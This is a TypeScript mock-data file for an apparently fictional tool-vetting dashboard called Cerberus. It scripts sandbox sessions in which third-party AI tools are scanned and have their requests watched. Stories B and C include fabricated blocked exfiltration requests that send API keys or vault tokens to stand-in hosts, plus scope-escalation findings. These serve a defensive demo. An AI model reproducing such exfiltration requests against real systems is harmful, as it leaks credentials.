/**
 * Cerberus - local mock data (the entire "backend" for this MVP)
 *
 * Four pre-scripted session stories designed to be played back on a timer (see Session Detail),
 * plus a couple of lightweight in-progress sessions for list screens.
 *
 * Data model mirrors the Phase 2 plan (Contain -> Attack -> Watch -> Verdict, compressed):
 * Docker sandbox + scoped zero-scope token (Contain), versioned seed-corpus payload attempts
 * (Attack), single session-end checkpoint with redacted egress logging (Watch), signed
 * non-boolean verdict (Verdict). Every mechanism here is SIMULATED - mock data, client-side JS,
 * no server calls, no real crypto. Story C is tagged "phase4-preview": it intentionally models
 * Phase 4 behaviour (multi-checkpoint cadence, trust delta) outside literal Phase 2 scope.
 *
 * All data is fabricated locally - no real backend, sandbox, or proxy.
 *
 * No async, no fetch - pure static data and pure helper functions only.
 */

import type { Session } from "@/lib/types";

/* ------------------------------------------------------------------ */
/*  Story A - "Clean Pass"                                          */
/* ------------------------------------------------------------------ */

const storyA: Session = {
  id: "session-a",
  candidate: {
    id: "cand_1f9a3c",
    toolName: "sheets-connector",
    vendor: "Acme Data",
    version: "2.1.0",
    sourceUrl: "https://github.com/acme-data/sheets-connector",
    declaredScopes: ["read:spreadsheets", "write:spreadsheets", "read:workspace-metadata"],
  },
  status: "complete",
  checkpoint: 1,
  totalCheckpoints: 1,
  startedAt: "2026-09-01T08:12:00Z",
  windowHours: 2,
  checkpointCount: 1,
  teardownVerifiedWithinSeconds: 9,
  bypassTestResult: {
    attempted: "raw TCP socket egress (bypassing mitmproxy)",
    blocked: true,
    note: "HTTP(S) boundary confirmed. Non-HTTP egress is a documented limitation, not claimed as covered.",
  },
  scopedToken: {
    header: { alg: "HS256", typ: "JWT" },
    payload: { scope: [], iat: 1788250320, exp: 1788257520, session_id: "session-a" },
  },
  planPhase: "phase2",
  findings: [
    {
      id: "fnd_a1c9d3",
      timestamp: "2026-09-01T08:12:25Z",
      category: "manifest & dependency scan",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0001",
      targetType: "manifest",
      detail:
        "Resolved lockfile contains 0 known-vulnerable packages; all 47 transitive dependencies pinned to exact versions.",
    },
    {
      id: "fnd_f7b21e",
      timestamp: "2026-09-01T08:12:28Z",
      category: "static credential scan",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0002",
      targetType: "docstring",
      detail:
        "No hardcoded secrets, tokens, or API keys found in source, config, or bundled artifacts.",
    },
    {
      id: "fnd_6d04aa",
      timestamp: "2026-09-01T08:15:10Z",
      category: "sandbox behavioral probe",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0003",
      targetType: "tool_description",
      detail:
        "Executed 214 instrumented tool calls in an isolated sandbox; none requested scopes outside the declared set, and the session token was never widened beyond its zero-scope issuance.",
    },
    {
      id: "fnd_9c51f0",
      timestamp: "2026-09-01T08:15:12Z",
      category: "filesystem isolation",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0004",
      targetType: "tool_description",
      detail:
        "All filesystem reads confined to the /tmp sandbox root; no writes escaped the sandbox boundary.",
    },
    {
      id: "fnd_3e8b77",
      timestamp: "2026-09-01T08:18:40Z",
      category: "egress surveillance window",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0005",
      targetType: "tool_description",
      detail:
        "Observed 18 outbound requests across the 2-hour watch window; all destinations matched the allow-list; no data-exfiltration pattern detected.",
    },
  ],
  egressLog: [
    {
      id: "eg_2f7c91",
      timestamp: "2026-09-01T08:17:02Z",
      destination: "api.acmedata.example.net",
      method: "GET",
      blocked: false,
      rawPreview:
        "GET /v4/spreadsheets/ss_9f2c?fields=properties HTTP/1.1\nHost: api.acmedata.example.net\nUser-Agent: sheets-connector/2.1.0",
      redactedPreview:
        "GET /v4/spreadsheets/ss_9f2c?fields=properties HTTP/1.1\nHost: api.acmedata.example.net\nUser-Agent: sheets-connector/2.1.0",
    },
    {
      id: "eg_9b45d0",
      timestamp: "2026-09-01T08:18:11Z",
      destination: "oauth.acmedata.example.net",
      method: "POST",
      blocked: false,
      rawPreview:
        "POST /oauth/token HTTP/1.1\nHost: oauth.acmedata.example.net\nAuthorization: Bearer sk_live_51Hxxxxxxxxxxxxxxxx\nContent-Type: application/x-www-form-urlencoded",
      redactedPreview:
        "POST /oauth/token HTTP/1.1\nHost: oauth.acmedata.example.net\nAuthorization: Bearer sk_live_51H****************\nContent-Type: application/x-www-form-urlencoded",
    },
  ],
  trustScore: {
    status: "not_applicable",
    label: "Trust score: not applicable — first submission for this tool",
  },
  verdict: "approved",
  verdictReason: "No escalation attempts detected. All declared scopes matched observed behavior.",
  signatureValid: true,
  signatureHash: "3f9c1e8a27b4d6052f6c91e8a3b7d4f05a1c2e8b4d7f09a36c2e5b8f41d7a09",
};

/* ------------------------------------------------------------------ */
/*  Story B - "Caught Immediately"                                 */
/* ------------------------------------------------------------------ */

const storyB: Session = {
  id: "session-b",
  candidate: {
    id: "cand_7c2e45",
    toolName: "invoice-bot",
    vendor: "QuickInvoice Inc",
    version: "1.0.0",
    sourceUrl: "https://registry.quickinvoice.example.net/invoice-bot",
    declaredScopes: ["read:invoices", "read:customers"],
  },
  status: "complete",
  checkpoint: 1,
  totalCheckpoints: 1,
  startedAt: "2026-09-01T09:04:00Z",
  windowHours: 2,
  checkpointCount: 1,
  teardownVerifiedWithinSeconds: 11,
  bypassTestResult: {
    attempted: "raw TCP socket egress (bypassing mitmproxy)",
    blocked: true,
    note: "HTTP(S) boundary confirmed. Non-HTTP egress is a documented limitation, not claimed as covered.",
  },
  scopedToken: {
    header: { alg: "HS256", typ: "JWT" },
    payload: { scope: [], iat: 1788253440, exp: 1788260640, session_id: "session-b" },
  },
  planPhase: "phase2",
  findings: [
    {
      id: "fnd_b3d7e9",
      timestamp: "2026-09-01T09:04:12Z",
      category: "escalation_attempt",
      result: "blocked",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0001",
      targetType: "credential_request",
      detail:
        "Candidate requested scope beyond declared permissions; denied at the identity layer before any credential was issued. Tool invoked vault.read requesting scope 'admin:workspace' — 3 levels broader than declared 'read:invoices'; identity.py refused the out-of-scope credential use 11s into execution and logged the attempt.",
    },
  ],
  egressLog: [
    {
      id: "eg_8f2a04",
      timestamp: "2026-09-01T09:04:11Z",
      destination: "data-relay-x7.example.net",
      method: "POST",
      blocked: true,
      rawPreview:
        "POST /ingest HTTP/1.1\nHost: data-relay-x7.example.net\nX-Api-Key: qk_live_7f3d9a1c2b8e4f60\nContent-Length: 4128",
      redactedPreview:
        "POST /ingest HTTP/1.1\nHost: data-relay-**.example.net\nX-Api-Key: qk_live_****************\nContent-Length: 4128",
    },
  ],
  trustScore: {
    status: "not_applicable",
    label: "Trust score: not applicable — first submission for this tool",
  },
  verdict: "rejected",
  verdictReason: "Rejected: attempted credential escalation detected on first checkpoint, outside declared scope.",
  signatureValid: true,
  signatureHash: "a7d4f05a1c2e8b4d7f09a36c2e5b8f41d7a09c3f9c1e8a27b4d6052f6c91e8b3",
};

/**
 * Story C - "The Showcase Story" (time-delayed evasion)
 *
 * Tagged "phase4-preview": deliberately OUTSIDE literal Phase 2 scope. It
 * previews Phase 4 behaviour — a multi-checkpoint watch cadence (checkpointCount 3)
 * and a numeric trust delta — which is exactly why it is labelled a preview.
 * Everything else (corpus, payload ids, teardown, bypass test, scoped token)
 * is populated the same way as the phase2 stories.
 */
const storyC: Session = {
  id: "session-c",
  candidate: {
    id: "cand_4e8b92",
    toolName: "crm-sync-agent",
    vendor: "Nimbus Labs",
    version: "3.4.0",
    sourceUrl: "https://github.com/nimbus-labs/crm-sync-agent",
    declaredScopes: ["read:contacts", "read:deals", "write:sync-state"],
  },
  status: "complete",
  checkpoint: 3,
  totalCheckpoints: 3,
  startedAt: "2026-09-01T07:30:00Z",
  windowHours: 72,
  checkpointCount: 3,
  teardownVerifiedWithinSeconds: 14,
  bypassTestResult: {
    attempted: "raw TCP socket egress (bypassing mitmproxy)",
    blocked: true,
    note: "HTTP(S) boundary confirmed. Non-HTTP egress is a documented limitation, not claimed as covered.",
  },
  scopedToken: {
    header: { alg: "HS256", typ: "JWT" },
    payload: { scope: [], iat: 1788247800, exp: 1788507000, session_id: "session-c" },
  },
  planPhase: "phase4-preview",
  findings: [
    {
      id: "fnd_c2e8b1",
      timestamp: "2026-09-01T07:31:05Z",
      category: "manifest & dependency scan",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0001",
      targetType: "manifest",
      detail:
        "Lockfile resolved clean; 42 transitive dependencies pinned to exact versions; no known vulnerable packages flagged.",
    },
    {
      id: "fnd_d71f3a",
      timestamp: "2026-09-01T07:31:40Z",
      category: "behavioral probe - batch 1",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0002",
      targetType: "tool_description",
      detail:
        "First 60s of instrumented execution: 87 tool calls, all within declared scopes.",
    },
    {
      id: "fnd_9a4c26",
      timestamp: "2026-09-01T07:34:05Z",
      category: "behavioral probe - batch 2",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0003",
      targetType: "tool_description",
      detail:
        "Minutes 2-3: 103 tool calls, all within declared scopes; every outbound request matched an allow-listed integration endpoint.",
    },
    {
      id: "fnd_b5e07d",
      timestamp: "2026-09-01T07:36:38Z",
      category: "delayed credential escalation attempt",
      result: "flagged",
      pattern: "time-delayed",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0004",
      targetType: "tool_description",
      detail:
        "After 4m 38s of clean behavior, tool requested vault.read scope 'read:all-contacts' - one level broader than declared 'read:contacts'. Payload pay_0004 matched a corpus-v1 time-delayed escalation pattern at the final checkpoint; timing consistent with time-based evasion. Held for manual review.",
    },
  ],
  egressLog: [
    {
      id: "eg_1c7d93",
      timestamp: "2026-09-01T07:33:02Z",
      destination: "api.nimbus-labs.example.net",
      method: "GET",
      blocked: false,
      rawPreview:
        "GET /v1/contacts?limit=100 HTTP/1.1\nHost: api.nimbus-labs.example.net\nUser-Agent: crm-sync-agent/3.4.0",
      redactedPreview:
        "GET /v1/contacts?limit=100 HTTP/1.1\nHost: api.nimbus-labs.example.net\nUser-Agent: crm-sync-agent/3.4.0",
    },
    {
      id: "eg_6a2f08",
      timestamp: "2026-09-01T07:35:14Z",
      destination: "sync-probe.nimbus-labs.example.net",
      method: "POST",
      blocked: false,
      rawPreview:
        "POST /sync/state HTTP/1.1\nHost: sync-probe.nimbus-labs.example.net\nAuthorization: Bearer nb_live_9a4c2ef71b8d3065\nContent-Length: 2046",
      redactedPreview:
        "POST /sync/state HTTP/1.1\nHost: sync-probe.nimbus-labs.example.net\nAuthorization: Bearer nb_live_****************\nContent-Length: 2046",
    },
    {
      id: "eg_3e9b57",
      timestamp: "2026-09-01T07:36:40Z",
      destination: "telemetry-edge-eu.example.net",
      method: "POST",
      blocked: true,
      rawPreview:
        "POST /collect HTTP/1.1\nHost: telemetry-edge-eu.example.net\nX-Vault-Token: hvs_9f2c71b8e4d6052f\nContent-Length: 8812",
      redactedPreview:
        "POST /collect HTTP/1.1\nHost: telemetry-edge-**.example.net\nX-Vault-Token: hvs_****************\nContent-Length: 8812",
    },
  ],
  trustScore: { status: "delta", direction: "down", label: "+1 flagged payload vs. v3.3.0" },
  verdict: "conditional",
  verdictReason:
    "Conditional: clean for 2 checkpoints, then attempted a delayed credential escalation at checkpoint 3. Recommend manual review before approval.",
  signatureValid: true,
  signatureHash: "f41d7a09c3f9c1e8a27b4d6052f6c91e8a3b7d4f05a1c2e8b4d7f09a36c2e5b8d",
};

/**
 * Story D - "The Canonical Phase 2 Demo"
 *
 * A dedicated, phase2-tagged clean run: single checkpoint at session end,
 * short watch window, zero-scope token, redacted egress, verified teardown,
 * bypass test documented as a boundary. This is literally what Phase 2
 * promises — kept separate from Story A so the demo can show "everything
 * passes" (A) and "the compressed real thing" (D) without them being identical.
 */
const storyD: Session = {
  id: "session-d",
  candidate: {
    id: "cand_6b1e08",
    toolName: "webhook-relay",
    vendor: "Fenwick Systems",
    version: "1.2.0",
    sourceUrl: "https://git.fenwick.example.net/webhook-relay",
    declaredScopes: ["write:webhooks", "read:endpoints"],
  },
  status: "complete",
  checkpoint: 1,
  totalCheckpoints: 1,
  startedAt: "2026-09-01T10:15:00Z",
  windowHours: 2,
  checkpointCount: 1,
  teardownVerifiedWithinSeconds: 8,
  bypassTestResult: {
    attempted: "raw TCP socket egress (bypassing mitmproxy)",
    blocked: true,
    note: "HTTP(S) boundary confirmed. Non-HTTP egress is a documented limitation, not claimed as covered.",
  },
  scopedToken: {
    header: { alg: "HS256", typ: "JWT" },
    payload: { scope: [], iat: 1788257700, exp: 1788264900, session_id: "session-d" },
  },
  planPhase: "phase2",
  findings: [
    {
      id: "fnd_d4e1a7",
      timestamp: "2026-09-01T10:15:18Z",
      category: "guardrails static-metadata scan",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0001",
      targetType: "tool_description",
      detail:
        "Name, description, and docstrings scanned against corpus-v1 (12 seed patterns); no prompt-injection or exfiltration patterns matched. Candidate code was never executed outside the sandbox during this pass.",
    },
    {
      id: "fnd_e7c53b",
      timestamp: "2026-09-01T10:15:44Z",
      category: "manifest & dependency scan",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0002",
      targetType: "manifest",
      detail:
        "Lockfile resolved clean; 31 transitive dependencies pinned to exact versions; 0 known-vulnerable packages.",
    },
    {
      id: "fnd_a9b2d4",
      timestamp: "2026-09-01T11:47:20Z",
      category: "sandbox behavioral probe",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0003",
      targetType: "tool_description",
      detail:
        "All 132 instrumented tool calls stayed within declared scopes; the scoped token was never widened beyond its zero-scope issuance and no standing credential was ever granted.",
    },
    {
      id: "fnd_c5f81e",
      timestamp: "2026-09-01T12:14:05Z",
      category: "egress surveillance window",
      result: "passed",
      pattern: "immediate",
      corpusVersion: "corpus-v1",
      payloadId: "pay_0004",
      targetType: "tool_description",
      detail:
        "Observed 11 outbound requests across the 2-hour watch window; all destinations matched the allow-list; every logged payload was redacted at the proxy before capture.",
    },
  ],
  egressLog: [
    {
      id: "eg_7d31b9",
      timestamp: "2026-09-01T10:52:33Z",
      destination: "hooks.fenwick.example.net",
      method: "POST",
      blocked: false,
      rawPreview:
        "POST /v1/hooks/sub_44f2 HTTP/1.1\nHost: hooks.fenwick.example.net\nAuthorization: Bearer fw_live_8d3c1a9e27b460f5\nContent-Type: application/json",
      redactedPreview:
        "POST /v1/hooks/sub_44f2 HTTP/1.1\nHost: hooks.fenwick.example.net\nAuthorization: Bearer fw_live_****************\nContent-Type: application/json",
    },
    {
      id: "eg_2b8c64",
      timestamp: "2026-09-01T11:38:47Z",
      destination: "registry.fenwick.example.net",
      method: "GET",
      blocked: false,
      rawPreview:
        "GET /v1/endpoints?status=active HTTP/1.1\nHost: registry.fenwick.example.net\nUser-Agent: webhook-relay/1.2.0",
      redactedPreview:
        "GET /v1/endpoints?status=active HTTP/1.1\nHost: registry.fenwick.example.net\nUser-Agent: webhook-relay/1.2.0",
    },
  ],
  trustScore: {
    status: "not_applicable",
    label: "Trust score: not applicable — first submission for this tool",
  },
  verdict: "approved",
  verdictReason:
    "No escalation attempts detected. Egress confined to the allow-listed HTTP(S) boundary; sandbox teardown verified. Approved as-is.",
  signatureValid: true,
  signatureHash: "b8e4f6052f6c91e8a3b7d4f05a1c2e8b4d7f09a36c2e5b8f41d7a09c3f9c1e8a2",
};

/* ------------------------------------------------------------------ */
/*  In-progress sessions (queued / running, no findings yet)         */
/* ------------------------------------------------------------------ */

/* Renumbered to session-e/session-f: "session-d" now belongs to Story D. */

const progressD: Session = {
  id: "session-e",
  candidate: {
    id: "cand_9d2f71",
    toolName: "pdf-summarizer",
    vendor: "Lumina AI",
    version: "0.9.2",
    sourceUrl: "https://github.com/lumina-ai/pdf-summarizer",
    declaredScopes: ["read:documents"],
  },
  status: "queued",
  checkpoint: 0,
  totalCheckpoints: 1,
  startedAt: "2026-09-01T09:41:00Z",
  windowHours: 2,
  checkpointCount: 1,
  teardownVerifiedWithinSeconds: 0,
  bypassTestResult: {
    attempted: "raw TCP socket egress (bypassing mitmproxy)",
    blocked: false,
    note: "Pending — bypass test executes at session teardown.",
  },
  scopedToken: {
    header: { alg: "HS256", typ: "JWT" },
    payload: { scope: [], iat: 1788255660, exp: 1788262860, session_id: "session-e" },
  },
  planPhase: "phase2",
  findings: [],
  egressLog: [],
  trustScore: {
    status: "not_applicable",
    label: "Trust score: not applicable — first submission for this tool",
  },
};

const progressE: Session = {
  id: "session-f",
  candidate: {
    id: "cand_2a7c51",
    toolName: "calendar-bridge",
    vendor: "Northwind Systems",
    version: "4.2.0",
    sourceUrl: "https://git.northwind.example.net/calendar-bridge",
    declaredScopes: ["read:calendars", "read:availability"],
  },
  status: "running",
  checkpoint: 1,
  totalCheckpoints: 1,
  startedAt: "2026-09-01T09:47:30Z",
  windowHours: 2,
  checkpointCount: 1,
  teardownVerifiedWithinSeconds: 0,
  bypassTestResult: {
    attempted: "raw TCP socket egress (bypassing mitmproxy)",
    blocked: false,
    note: "Pending — bypass test executes at session teardown.",
  },
  scopedToken: {
    header: { alg: "HS256", typ: "JWT" },
    payload: { scope: [], iat: 1788256050, exp: 1788263250, session_id: "session-f" },
  },
  planPhase: "phase2",
  findings: [],
  egressLog: [],
  trustScore: {
    status: "not_applicable",
    label: "Trust score: not applicable — first submission for this tool",
  },
};

/* ------------------------------------------------------------------ */
/*  Exports + lookup helper                                            */
/* ------------------------------------------------------------------ */

/** The four pre-scripted stories, in play-back order. */
export const mockSessions: Session[] = [storyA, storyB, storyC, storyD];

/** Lightweight in-progress sessions (queued / running) for list screens. */
export const mockCandidatesInProgress: Session[] = [progressD, progressE];

/** Every session the UI knows about - stories plus in-progress. */
export const allMockSessions: Session[] = [...mockSessions, ...mockCandidatesInProgress];

const sessionById = new Map<string, Session>(allMockSessions.map((session) => [session.id, session]));

/** Synchronous lookup by session id; returns undefined for unknown ids. */
export function getSessionById(id: string): Session | undefined {
  return sessionById.get(id);
}